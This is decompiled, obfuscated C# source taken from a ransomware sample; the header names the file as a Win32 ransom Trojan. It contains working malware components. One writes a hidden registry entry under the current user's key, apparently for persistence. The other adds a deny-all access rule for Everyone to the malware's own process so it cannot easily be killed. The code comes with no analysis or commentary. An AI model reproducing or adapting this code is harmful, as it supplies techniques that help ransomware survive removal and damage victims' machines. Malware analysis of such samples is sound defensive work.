// Decompiled with JetBrains decompiler
// Type: PMpBbYpvEb.UQolrMmPyk
// Assembly: sloc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8380720F-5D35-42C0-94D8-715B8457E8C4
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.Win32.Generic-39a044db72d3ca39122af249cd60660d7e200366af958c762910605eaed020cb.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace PMpBbYpvEb
{
  internal sealed class UQolrMmPyk
  {
    [NonSerialized]
    internal static GetString \u0080;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool yUAfKQAMqkk(
      IntPtr vfFGkVLeQhfmgf,
      int qYElQdfQoxge,
      [Out] byte[] ORapXiQPwY,
      uint qMyZQZufBc,
      out uint zzOSfvSObEWu);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool xvtaGcRSZzRsasDMy(
      IntPtr xzuqeNIouJNKRk,
      int UQpLtsnlUwaNn,
      [In] byte[] bYXqRMQoWIwnZ);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr DAcuKRHGFuh();

    public void vKoaGyOgRXWde([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.xTaQFUIySYvoZ(UQolrMmPyk.\u0080(107412413))));
        subKey.SetValue(PhxOPeBqRsG.jPRGqhYdKzNWs(UQolrMmPyk.\u0080(107411796)), (object) UQolrMmPyk.\u0080(107381798));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor jnDfjHRTMbAooid([In] IntPtr obj0)
    {
      byte[] ORapXiQPwY = new byte[0];
      uint zzOSfvSObEWu;
      UQolrMmPyk.yUAfKQAMqkk(obj0, 4, ORapXiQPwY, 0U, out zzOSfvSObEWu);
      byte[] binaryForm;
      return zzOSfvSObEWu < 0U || zzOSfvSObEWu > (uint) short.MaxValue || !UQolrMmPyk.yUAfKQAMqkk(obj0, 4, binaryForm = new byte[(IntPtr) zzOSfvSObEWu], zzOSfvSObEWu, out zzOSfvSObEWu) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void OMjJGdLGoHugiW([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      UQolrMmPyk.xvtaGcRSZzRsasDMy(obj0, 4, numArray);
    }

    public void XEFRTofdocNy()
    {
      try
      {
        IntPtr num = UQolrMmPyk.DAcuKRHGFuh();
        RawSecurityDescriptor securityDescriptor = this.jnDfjHRTMbAooid(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.OMjJGdLGoHugiW(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static UQolrMmPyk() => Strings.CreateGetStringDelegate(typeof (UQolrMmPyk));
  }
}
